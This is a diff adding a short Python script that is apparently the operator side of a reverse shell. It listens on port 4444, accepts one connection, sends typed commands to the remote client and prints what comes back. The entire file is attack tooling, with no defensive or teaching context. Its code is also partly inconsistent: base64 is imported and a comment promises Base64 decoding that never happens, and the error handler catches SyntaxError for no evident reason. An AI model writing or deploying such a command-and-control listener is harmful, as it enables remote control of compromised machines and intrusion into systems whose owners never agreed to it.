@@ -1,0 +1,41 @@
+import socket
+import base64
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+port = 4444  # Chosen port
+lhost = "0.0.0.0"
+s.bind((lhost, port))
+s.listen(1)
+print(f"[~] Listening on {lhost}:{port}")
+conn, addr = s.accept()
+print(f"[+] Connection accepted {addr}")
+
+while True:
+    try:
+        cmd = input("> ")  # Wait for user input for the command
+        conn.sendall(cmd.encode())  # Send the command to the client
+        
+        # Receive all data from the client
+        full_data = b""  # Initialize an empty byte string
+        while True:
+            data = conn.recv(1024)  # Receive data from the client
+            if not data:  # If no more data is received, break the loop
+                break
+            full_data += data  # Append received data
+            
+            # Check if we received the termination signal
+            if b'END' in data:  # Assuming 'END' is sent by the client to indicate end of transmission
+                break
+
+        if full_data:
+            # Remove the termination signal from the received data
+            full_data = full_data.replace(b'END', b'')
+            # Decode the Base64 response before printing it
+            decoded_data = full_data.decode('utf-8') 
+            print(decoded_data)  # Print the client's response
+            
+    except SyntaxError:
+        print("[!] ERROR!")
+
+print("Closing connection")
+conn.close()
